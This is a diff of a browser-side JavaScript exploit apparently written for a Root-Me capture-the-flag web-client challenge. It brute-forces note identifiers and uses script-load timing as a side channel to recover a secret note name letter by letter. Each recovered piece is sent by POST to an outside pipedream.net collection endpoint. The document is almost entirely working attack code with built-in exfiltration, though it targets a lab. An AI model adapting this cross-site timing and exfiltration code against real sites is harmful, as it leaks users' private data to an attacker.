@@ -1,5 +1,4 @@
 <script>
-let adminId = -1;
 function sendRequest(url) {
     let xhr = new XMLHttpRequest();
     xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
@@ -22,78 +21,49 @@ function getKeyOfGreatestElement(dictionary) {
   
     return maxKey;
   }
-
-  
-  async function checkId(id) {
-      return new Promise((resolve, reject) => {
-          
-          const script = document.createElement('script');
-          script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}`;
-          script.onload = () => {
-              adminId = id;
-              resolve();
-            };
-            script.onerror = reject;
-            document.body.appendChild(script);
-        })
-    } 
     
 async function attack() {
-    sendRequest("nav="+navigator.userAgent)
+    sendRequest("test=true")
     let noteName = "";
     let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn"; //the flag is supposed to be composed of only lowercase letters
-    for (let i = 200000; i < 1000000; i++) {
-        //retrieve admin id
-        try {
-            await checkId(i);
-        } catch (error) {
-            continue;
-        }
-    
-        //find final name
-        if (adminId != -1) {
-            i = 100000001;
-            sendRequest(`adminId=${adminId}`)
-            //suposing the flag is 32 characters long
-            while (noteName.length < 32) {
-                let times = {};
-                for (let j = 0; j < lowercase_letters.length; j++) {
-                    const l = lowercase_letters[j];
+    //suposing the flag is 32 characters long
+    let i = 0;
+    while (i < 10001 && noteName.length < 32) {
+        let times = {};
+        let j = 0;
+        while (j < lowercase_letters.length) {
+            const l = lowercase_letters[j];
+            
+            try {
+                await new Promise((resolve, reject) => {
+                    //fetch page
+                    var script = document.createElement('script');
+                    script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}/${noteName + l}`;
+                    document.body.appendChild(script);
+                    // Start the clock
+                    var start = performance.now();
                     
-                    try {
-                        await new Promise((resolve, reject) => {
-                            //fetch page
-                            var script = document.createElement('script');
-                            script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName + l}`;
-                            document.body.appendChild(script);
-                            // Start the clock
-                            var start = performance.now();
-                            
-                            // When script loads, caculate the time it took to finish the request
-                            script.onload = () => {
-                                var time = performance.now() - start;
-                                times[l] = time;
-                                resolve();
-                            }
-                        })
-                        
-                    } catch (error) {
-                        console.log("Error on script");
+                    // When script loads, caculate the time it took to finish the request
+                    script.onload = () => {
+                        var time = performance.now() - start;
+                        times[l] = time;
+                        resolve();
                     }
-                    
-                }
-                noteName += getKeyOfGreatestElement(times);
-                //partially send the name to keep progress of the attack
-                sendRequest(`note_name=${noteName}`);
+                    script.onerror = reject;
+                })
+                
+            } catch (error) {
+                i+=1;
+                j=0;
+                continue;
             }
-    
-            //retrieve final name 
-            sendRequest("url=" + encodeURIComponent(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName}`));
+            j++;
         }
-        
-    }
-    sendRequest("adminId="+adminId);
+        noteName += getKeyOfGreatestElement(times);
+        //partially send the name to keep progress of the attack
+        sendRequest(`note_name=${noteName}`);
+    }      
+    sendRequest("result=false");
 }
 attack();
-
 </script>
